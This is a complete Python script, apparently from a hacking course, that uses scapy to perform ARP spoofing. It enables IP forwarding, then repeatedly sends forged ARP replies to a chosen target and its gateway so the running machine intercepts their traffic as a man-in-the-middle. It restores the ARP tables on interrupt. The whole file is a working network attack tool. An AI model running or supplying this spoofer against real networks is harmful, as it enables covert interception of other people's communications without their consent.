#!/usr/bin/env python
import argparse
import subprocess
import time

import scapy.all as scapy


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target, use --help for more info")
    elif not options.gateway:
        parser.error("[-] Please specify a gateway, use --help for more info")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

try:
    # Setup port forwarding
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    print("Port forwarding setup done!")
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)  # Send to target. Set attacker machine as router
        spoof(gateway_ip, target_ip)  # Send to router. Set attacker machine as router
        sent_packets_count += 2
        # print(f"\n[+] Packets sent: {sent_packets_count}"), sys.stdout.flush() # python 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detecting CTRL + C .... Resetting ARP tables... Please wait\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

# op=1 - ARP request
# op=2 - ARP response
